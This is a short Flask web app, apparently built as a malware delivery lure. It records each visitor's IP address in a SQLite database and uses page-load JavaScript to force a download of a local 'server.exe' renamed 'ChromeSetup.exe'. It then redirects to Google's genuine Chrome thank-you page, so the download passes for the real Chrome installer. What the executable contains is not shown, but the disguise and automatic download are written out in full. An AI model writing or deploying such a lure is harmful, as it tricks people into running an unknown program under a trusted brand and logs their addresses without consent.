import sqlite3
from flask import Flask, request, send_file, redirect, render_template_string

# Create a Flask app instance
app = Flask(__name__)

# Create the users table in the SQLite database
conn = sqlite3.connect('mydatabase.db')
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS users (ip_address TEXT)")
conn.commit()
conn.close()

# Define a route to handle incoming requests
@app.route("/")
def index():
    # Get the IP address of the user that made the request
    ip_address = request.headers.get('X-Forwarded-For')
    # Extract the private IP address from the X-Forwarded-For header if available
    if ip_address:
        ip_address = ip_address.split(',')[0].strip()
    else:
        ip_address = request.remote_addr
    # Insert the IP address into the SQLite database
    conn = sqlite3.connect('mydatabase.db')
    c = conn.cursor()
    c.execute("INSERT INTO users (ip_address) VALUES (?)", (ip_address,))
    conn.commit()
    conn.close()

    # Render a template with JavaScript to initiate the file download and redirect
    template = """
    <script>
    function downloadAndRedirect() {
        window.location.href = '/download';
        setTimeout(function() {
            window.location.href = 'https://www.google.com/chrome/thank-you.html';
        }, 500);
    }
    downloadAndRedirect();
    </script>
    """
    return render_template_string(template)

# Define a route to handle the file download
@app.route("/download")
def download():
    # Send the file "server.exe" to the client as an attachment
    return send_file('server.exe', as_attachment=True, attachment_filename='ChromeSetup.exe')

# Start the Flask app
if __name__ == "__main__":
    app.run(host='0.0.0.0')
